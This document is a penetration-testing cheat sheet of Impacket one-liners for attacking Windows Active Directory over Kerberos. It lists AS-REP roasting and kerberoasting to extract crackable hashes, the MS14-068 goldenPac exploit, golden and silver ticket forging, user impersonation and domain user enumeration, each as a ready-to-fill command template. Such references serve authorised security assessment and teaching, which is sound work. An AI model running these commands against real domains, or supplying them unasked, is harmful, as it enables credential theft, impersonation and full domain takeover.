# Impacket

% impacket, windows, kerberos, 88

## GetNPUsers without password to get TGT (ASREPRoasting)
#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user

```bash
GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
```

## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user

```bash
GetNPUsers.py -dc-ip <dc-ip> <domain>/ -usersfile <users_file> -format hashcat
```

## GetUserSPNs - find Service Principal Names that are associated with a normal user account (kerberoasting)
#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user

```bash
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip> -outputfile user_SPN.ticket
```

## MS14-068 - goldenPac
#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user

```bash
goldenPac.py -dc-ip <dc-ip> <domain>/<user>:'<password>'@<target>
```

## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user

```bash
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
```

## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user

```bash
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
```

## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user

```bash
ticketConverter.py <ccache_ticket_file> <ticket_kirbi_file>
```

## Silver ticket - impersonate user
#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user

```bash
getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
```

## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user

```bash
getTGT.py -dc-ip <dc-ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
```

## GetADUser - gather data about the domain’s users and their corresponding email addresses
#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user

```bash
GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc-ip>
```

= ip: 192.168.1.0
= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
